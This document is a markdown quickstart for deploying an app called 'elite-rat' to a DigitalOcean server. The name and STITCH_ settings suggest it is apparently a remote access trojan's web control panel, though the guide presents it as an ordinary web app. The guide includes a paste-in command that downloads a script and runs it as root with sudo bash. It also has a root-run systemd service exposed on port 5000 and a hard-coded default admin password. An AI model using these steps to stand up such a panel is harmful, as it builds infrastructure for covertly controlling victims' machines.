# ⚡ QUICKSTART: Deploy to DigitalOcean in 5 Minutes

## The Absolute Fastest Way 🚀

### Step 1: Create Your Server
1. Go to DigitalOcean → Click "Create" → Choose "Droplets"
2. Select: **Ubuntu 22.04 LTS**
3. Choose: **$6/month plan** (Basic, Regular)
4. Pick a datacenter close to you
5. Authentication: **Password** (easiest) or SSH key (more secure)
6. Click **"Create Droplet"**
7. **Copy your server's IP address** (looks like: 123.45.67.89)

### Step 2: Connect to Your Server
Open Terminal (Mac/Linux) or PuTTY (Windows):
```bash
ssh root@YOUR_IP_ADDRESS
# Type 'yes' when asked
# Enter your password
```

### Step 3: Run The Magic Command ✨
Copy this entire block and paste it into your server:

```bash
# Download and run the auto-installer
cd /tmp
wget https://raw.githubusercontent.com/YOUR_REPO/main/auto_deploy_digitalocean.sh
sudo bash auto_deploy_digitalocean.sh
```

**OR** if you already have the code on your server:

```bash
cd /opt
git clone YOUR_GITHUB_REPO_URL elite-rat
cd elite-rat
sudo bash auto_deploy_digitalocean.sh
```

**OR** the absolute simplest - manual but fast:

```bash
# Update system
apt update && apt upgrade -y

# Install essentials
apt install -y python3 python3-pip python3-venv nginx ufw git

# Create directory
mkdir -p /opt/elite-rat
cd /opt/elite-rat

# Upload your code here (or use git clone)
# git clone YOUR_REPO_URL .

# Create Python environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Create quick config
cat > .env << 'EOF'
STITCH_ADMIN_USER=admin
STITCH_ADMIN_PASSWORD=YourSecurePassword123!
STITCH_HOST=0.0.0.0
STITCH_PORT=5000
STITCH_DEBUG=false
EOF

# Create service
cat > /etc/systemd/system/elite-rat.service << 'EOF'
[Unit]
Description=Elite RAT Web App
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/elite-rat
Environment="PATH=/opt/elite-rat/venv/bin"
ExecStart=/opt/elite-rat/venv/bin/python3 web_app_real.py
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Start it
systemctl daemon-reload
systemctl enable elite-rat
systemctl start elite-rat

# Open firewall
ufw allow 22
ufw allow 80
ufw allow 5000
ufw --force enable

# Done!
echo "✅ App is running!"
echo "🌐 Visit: http://$(curl -s ifconfig.me):5000"
echo "👤 Username: admin"
echo "🔑 Password: YourSecurePassword123!"
```

### Step 4: Access Your App! 🎉
Open your browser and go to:
```
http://YOUR_IP_ADDRESS:5000
```

Login with:
- **Username:** `admin`
- **Password:** (whatever you set in the .env file)

---

## That's It! 🎊

You now have a live web app running on the internet!

---

## Common Issues & Fixes

**Can't connect?**
```bash
# Check if it's running
systemctl status elite-rat

# View logs
journalctl -u elite-rat -n 50

# Restart if needed
systemctl restart elite-rat
```

**Forgot password?**
```bash
# Check your .env file
cat /opt/elite-rat/.env | grep PASSWORD
```

**Want to stop it?**
```bash
systemctl stop elite-rat
```

---

## Pro Tips 💡

1. **Change the default password immediately**
2. **Set up a domain name** (easier than remembering IP)
3. **Enable HTTPS** (free with Let's Encrypt):
   ```bash
   apt install certbot python3-certbot-nginx
   certbot --nginx
   ```
4. **Monitor your app:**
   ```bash
   journalctl -u elite-rat -f
   ```

---

## What Did This Do?

In plain English:
1. ✅ Created a cloud computer (server)
2. ✅ Installed Python and web server
3. ✅ Uploaded your code
4. ✅ Made it run automatically forever
5. ✅ Opened it to the internet
6. ✅ Protected it with a firewall

**Total cost:** ~$6/month (destroy anytime to stop charges)

---

## File Structure on Server

```
/opt/elite-rat/               # Your app lives here
├── .env                      # Your settings & password
├── venv/                     # Python environment
├── web_app_real.py          # Main app file
├── requirements.txt          # Dependencies list
├── Application/              # App modules
├── Core/                     # Core functionality
├── templates/               # HTML files
└── static/                  # CSS, JS, images

/var/log/elite-rat.log       # App logs
/etc/systemd/system/elite-rat.service  # Auto-start config
```

---

## Need Help?

Check the full guide: `DIGITALOCEAN_LAUNCH_GUIDE.md`

Or view logs to see what's happening:
```bash
journalctl -u elite-rat -f
```

---

**🎉 Congratulations! You're now running a web app in the cloud!**
